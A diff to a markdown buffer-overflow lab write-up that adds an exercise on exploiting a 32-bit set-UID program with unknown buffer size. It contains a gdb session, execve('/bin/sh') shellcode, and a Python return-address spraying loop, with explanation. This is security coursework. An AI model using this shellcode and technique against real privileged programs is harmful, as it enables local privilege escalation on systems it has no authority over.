@@ -104,7 +104,9 @@ gdb-peda$ b bof
 Breakpoint 1 at 0x80484c1: file stack.c, line 18.
 gdb-peda$ run
 ...
-Breakpoint 1, bof (str=0xbfffeb57 "\bB\003") at stack.c:18
+Breakpoint 1, bof (
+...
+gdb-peda$ next
 18	    strcpy(buffer, str); 
 ...
 gdb-peda$ p &buffer
@@ -128,8 +130,6 @@ To exploit the buffer-overflow vulnerability in the target program, we need to p
 
 We will utilize the `/Lab7/exercise3/exploit.py` program for this purpose. We will start with the base Python script provided in the lab setup and make the following modifications:
 
-
-
 ```python
 # Place the shellcode towards the end of the buffer
 shellcode= (
@@ -152,4 +152,61 @@ Finally running `/Lab7/exercise3/stack-L1` (the set-UID program) will give us th
 
 ![attacks](/Lab7/exercise3/img/2.png)
 
-## Exercise 4: Launching Attack on 32-bit Program (Level 2)
+## Exercise 4: Launching Attack without Knowing Buffer Size (Level 2)
+
+In this task, we are going to add a constraint: you can still use gdb, but you are not allowed to derive the buffer size from your investigation. Actually, the buffer size is provided in `Makefile`, but you are not allowed to use that information in your attack.
+
+Your task is to get the vulnerable program to run your shellcode under this constraint. We assume that
+you do know the range of the buffer size, which is from 100 to 200 bytes. Another fact that may be useful
+to you is that, due to the memory alignment, the value stored in the frame pointer is always multiple of four
+(for 32-bit programs).
+
+On this attack we will use the files created on `Exercise 2`, specially `/Lab7/exercise4/stack-L2` and `/Lab7/exercise4/stack-L2-dbg`.
+
+To do this attack we will use `Spraying Technique`, it involves flooding the memory with a large number of shellcode this will increase the chances of successfully redirecting the program's execution flow to the `badfile`.
+
+First we will use `gdb` to find the buffer address:
+```bash
+[04/06/24]seed@VM:~/.../ex4$ gdb stack-L2-dbg 
+gdb-peda$ b bof
+Breakpoint 1 at 0x80484c1: file stack.c, line 18.
+gdb-peda$ run
+...
+Breakpoint 1, bof (
+...
+gdb-peda$ next
+18	    strcpy(buffer, str); 
+gdb-peda$ p &buffer
+$1 = (char (*)[160]) 0xffffce60
+```
+
+![attacks](/Lab7/exercise4/img/1.png)
+
+We will utilize the `/Lab7/4/exploit.py` program for this purpose. We will start with the base Python script provided in the lab setup and make the following modifications:
+
+
+
+```python
+# Place the shellcode towards the end of the buffer
+shellcode= (
+    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
+    "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
+    "\xd2\x31\xc0\xb0\x0b\xcd\x80"
+).encode('latin-1')
+
+# 32-bit architecture
+L = 4
+
+# Return address 
+ret = 0xffffce60 + 400
+
+# Spray the buffer with return address
+for offset in range (50):
+	content[offset*L:offset*L + L] = (ret).to_bytes(L, byteorder='little')
+```
+
+We use the spraying technique to construct the first `ret` bytes of the buffer, and we put 517 bytes of NOP afterward, followed by the malicious code. The value added to the buffer address is arbitrary, but since we know the range of the buffer is 100 to 200 bytes, we need to use a number larger than 200. Actually, because of the NOPs, any address between this value and the starting of the malicious code can be used. 
+
+The loop iterates 50 times because we know that the buffer size is in the range of 100 to 200 bytes, and on a 32-bit architecture, each memory address occupies 4 bytes. Therefore, dividing the upper bound of the buffer range (200 bytes) by the size of each memory address (4 bytes) gives us 50 iterations. Additionally, we use `offset*L` as the initial index and `offset*L + L` as the final index to ensure that we align with memory boundaries, as values stored in the frame pointer are always multiples of four due to memory alignment considerations. 
+
+![attacks](/Lab7/exercise4/img/2.png)
